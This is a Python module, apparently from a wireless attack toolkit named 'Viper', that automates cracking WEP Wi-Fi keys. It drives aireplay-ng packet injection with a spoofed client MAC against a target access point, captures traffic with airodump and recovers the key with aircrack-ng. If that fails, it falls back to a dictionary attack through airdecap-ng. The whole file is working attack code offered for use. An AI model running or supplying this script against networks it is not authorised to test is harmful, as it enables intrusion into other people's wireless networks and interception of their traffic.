from Viper.util.channel import change_channel
from Viper.scan.dump import airodump

import subprocess
from threading import Thread
import os
import time
import re


def aireplay(interface, ap_mac_address, c_mac, seconds):
    print('Starting aireplay')
    try:
        command = subprocess.run(['aireplay-ng', '-3', '-b', ap_mac_address, '-h',
                       c_mac, interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=seconds)
        print(command.args)
    except subprocess.TimeoutExpired:
        pass


def wep_crack(interface, ap_mac_address, c_mac, channel, directory, seconds, dictionary):
    orignial_time = seconds
    pcapfilewep = os.path.join(directory, 'wep')
    passfile = os.path.join(directory, 'wep_password')
    change_channel(interface, channel)
    print(pcapfilewep)
    ctr = 1
    while ctr < 4:
        print(f'Starting iteration {ctr}')
        a = Thread(target=aireplay, args=(
            interface, ap_mac_address, c_mac, seconds,))
        b = Thread(target=airodump, args=(
            interface, ap_mac_address, channel, pcapfilewep, seconds,))
        a.start()
        b.start()

        time.sleep(seconds)
        a.join()
        b.join()
        try:
            subprocess.run(['aircrack-ng', f'{pcapfilewep}-0{ctr}.cap', '-l',
                            f'{passfile}'], stdout=subprocess.DEVNULL, timeout=10)
        except subprocess.TimeoutExpired:
            pass

        if os.path.exists(passfile):
            with open(passfile, 'r') as f:
                password = bytes.fromhex(f.read()).decode()
            return password
        else:
            print('Failed, increasing time')
            seconds += orignial_time
            ctr += 1

    wep_crack_no_ivs(pcapfilewep, dictionary)


def wep_crack_no_ivs(pcapfilewep, dictionary):

    lst = open(dictionary, 'r')
    for line in lst:
        word = re.sub(r'\W+', '', line)
        word.isalpha()
        word = word.encode('utf-8').hex()
        p = subprocess.Popen(
            ['airdecap-ng', '-w', word, f'{pcapfilewep}-03.cap'], stdout=subprocess.PIPE)
        output = p.stdout.read().decode().split('\n')
        for i in output:
            if 'Number of decrypted WEP  packets' in i:
                if int(i.split(' ')[-1]) > 0:
                    password = line
                    return password

    return None
